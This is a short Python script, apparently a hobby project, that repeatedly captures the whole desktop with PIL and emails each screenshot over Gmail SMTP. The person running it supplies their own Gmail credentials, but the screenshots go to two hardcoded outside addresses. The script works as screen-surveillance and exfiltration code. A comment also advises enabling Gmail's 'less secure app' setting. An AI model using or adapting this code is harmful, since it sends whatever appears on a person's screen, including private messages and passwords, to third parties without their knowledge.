try:
    from PIL import ImageGrab as ig
    import smtplib
    from email.message import EmailMessage
    import imghdr
    from time import sleep

except:
    print('download module pillow use command pip install pillow')
    exit()

if __name__ == "__main__":
    sender_mail = input("Enter your mail id here:->") #your mail id
    password_sender = input("Enter password:->")   #your password here
        #make sure to enable less secure app in your gmail section otherwise not work 
    l = ["experimentallyf@gmail.com", "bollyknow@gmail.com"]

    i = 0
    limit = int(input('enter total no. of mails:'))
    #c=input('Any message to display:')
    c = open('index.txt','r').read()
    if c=='':
        c=" "
    subj = input('Enter subject of mail:->')
    while i < limit:
        ig.grab().save(fp="Desktop.jpeg")
        with open('Desktop.jpeg', 'rb') as f:
            file_data = f.read()
            file_type = imghdr.what(f.name)
            file_name = f.name
        message = EmailMessage()
        message['To'] = l
        message['From'] = sender_mail
        message['Subject'] = subj
        message.set_content(c)
        message.add_attachment(file_data, maintype='image',
                               subtype=file_type, filename=file_name)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_mail, password_sender)
            server.send_message(message)
            print(f"send to {l} {i+1}")
            sleep(15)    #9 sec to process(default) 10 sec sleep means every 24 sec to send a ss.

        except:
            print("something went wrong!!!!!")
            print("Try connecting to internet.")
            print('server not connected or file is corrupted or check mail id and password')

        i += 1
